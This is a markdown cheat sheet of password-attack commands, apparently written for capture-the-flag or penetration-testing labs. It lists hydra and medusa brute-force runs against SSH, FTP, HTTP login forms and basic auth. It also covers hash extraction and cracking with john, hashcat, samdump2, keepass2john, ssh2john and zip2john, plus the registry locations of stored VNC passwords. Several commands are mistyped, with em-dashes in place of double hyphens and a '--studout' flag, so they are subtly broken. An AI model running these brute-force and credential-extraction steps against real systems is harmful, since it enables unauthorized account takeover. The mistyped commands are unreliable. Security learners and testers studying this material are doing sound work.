# Cheetsheet

## Finding Passwords
```
grep -rl hash
grep -rl password
```

## Mutate wordlists
```
/etc/john/john.conf
> $[0-9]$[0-9]
```

```
john --wordlist=out.txt --rules --stdout > mutated.txt
```

## Password Cracking
```
john hashes.txt
```

## Htaccess

```
medusa -h ip -u admin -P passwords.txt -M http -m DIR:/admin -T 20
```

## FTP
```
hydra  -l admin -P pass.txt -v ip ftp
```

## HTTP Post
```
hydra -l none -P rockyou.txt 10.10.10.43 http-post-form
"/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
```

## SSH

```
hydra -L usernames.txt -P passwords.txt -s 2222 ssh://10.10.10.66 -v -t 4
```

## Basic Auth
```
cewl example.com -m 6 -w /root/mega-cewl.txt 2> /dev/null
john --wordlist=mega-cewl.txt --rules --studout > mega-cewl-mutated.txt
medusa -h admin.example.com -u admin -P mega-cewl-mutated.txt -M http -n 81 -m DIR:/admin -T 30
```

## Salted Hash Cracking

### oclHashcat

oclHashcat input file should be in format: `passwordhash:salt`

```
oclHashcat-plus64.bin -m 110 hashes.txt ../big-wordlist --force
```

## RSA Private Key Password Recovery

```
ssh2john id_rsa > id_john
john id_john --wordlist=<PATH TO ROCKYOU.TXT>
```

## KeePass Password Recovery

```
keepass2john jeeves.kdbx > jeeves.hash
john jeeves.hash
```

## /etc/passwrd format

- [Understanding /etc/passwd File Format](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)
- [Linux Password & Shadow File Formats](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)
- Password Field
  - Format: `$id$salt$hashed` (`$id$$hashed` means no salt)
  - `*` account cannot be used to log in
  - `!!` user doesn't have a password
  - ` ` user doesn't have a password
  - `x` password is stored in the shadow file
  - id
    - `$1$` is MD5
    - `$2a$` is Blowfish
    - `$2y$` is Blowfish
    - `$5$` is SHA-256
    - `$6$` is SHA-512

Verify
```
pwck -r /etc/passwd
pwck -r /etc/shadow
```

Edit
```
vipw -p
vipw -s
vipw -g
```

Manually create password
```
openssl passwd -1 -salt xyz  yourpass
makepasswd --clearfrom=- --crypt-md5 <<< YourPass
mkpasswd  -m sha-512 -s <<< YourPass
echo -e "md5crypt\npassword" | grub | grep -o "\$1.*"
perl -e 'use Crypt::PasswdMD5; print unix_md5_crypt("Password", "Salt"),"\n"'
```

Update password
```
echo "username:password" | chpasswd
```
```
perl -e 'print crypt("YourPasswd", "salt"),"\n"'
echo "username:encryptedPassWd"  | chpasswd -e
OR
useradd -p 'encryptedPassWd'  username
```

## VNC

```
reg query HKLM\SOFTWARE\RealVNC\vncserver
Value: Password

reg query HKCU\Software\TightVNC\Server
Value: Password or PasswordViewOnly

reg query HKLU\Software\TigerVNC\WinVNC4
reg query HKLM\Software\TigerVNC\WinVNC4
Value: Password

C:\Program Files\UltraVNC\ultravnc.ini
Value: passwd or passwd2
```












## Crack Linux Hash
```
unshadow passwd.txt shadow.txt > hashes.txt
john —wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Cisco hashes
```
python3 cisco_pwdecrypt.py -u "\$1\$pdQG\$o8nrSzsGXeaduXrjlvKc91" -d /usr/share/wordlists/rockyou.txt
```

## To Decrypt gpg files:
```
gpg —batch —passphrase whateverThePasswordIs-d theGPGfile
```

## SAM files
```
either in C:\windows\system32\config\sam or C:\windows\repair\sam - (THIS WILL NOT ALWAYS CONTAIN COMPLETE OR UP TO DATE LISTINGS)
will be encrypted 128bit rivest cipher - the key to syskey utility is called "bootkey" which is stored in system file which is in C:\windows\repair\system
after this we use samdump2 to both get the syskey from system file and use that to decrypt the hashes from uncle Sam (bless his cotton socks)
example: samdump2 system_file sam_file

After this you can run hashes through johnny boi
john <outputfile.txt>
```

## If you see the below header after running strings, it has been encoded with steganography
56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz

To decrypt the file I use steghide
steghide extract -sf <OR> info <image.jpg> NOTE that it will always ask for a passphrase! this does not mean it HAS one, try enter!

## WordPress Hash example:
```
$P$B9wJdX0NkO95U2L.kqAGXsFufwSp5N1
hashcat —force -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```

## SSH key bruteforce
```
To bruteforce pubkey grep -lr against one of the folders from here: https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys

dsa = 1024
rsa = 2048
```

## Zip files
```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file_name>
zip2john file.zip > file.zip.hash
john -w:/usr/share/wordlists/rockyou.txt file.zip.hash
```

## SSH2john
```
/usr/share/john/ssh2john.py id_rsa > ssh.hash
john -w:/usr/share/wordlists/rockyou.txt ssh.hash
```

## List of known/common passwords or keywords through cewl?
```
Narrow them down into a custom wordlist

grep -i hentai /usr/share/wordlists/rockyou.txt > pass.lst
grep -i pokemon /usr/share/wordlists/rockyou.txt » pass.lst
grep -i monkey /usr/share/wordlists/rockyou.txt » pass.lst
grep -i startrek /usr/share/wordlists/rockyou.txt » pass.lst
```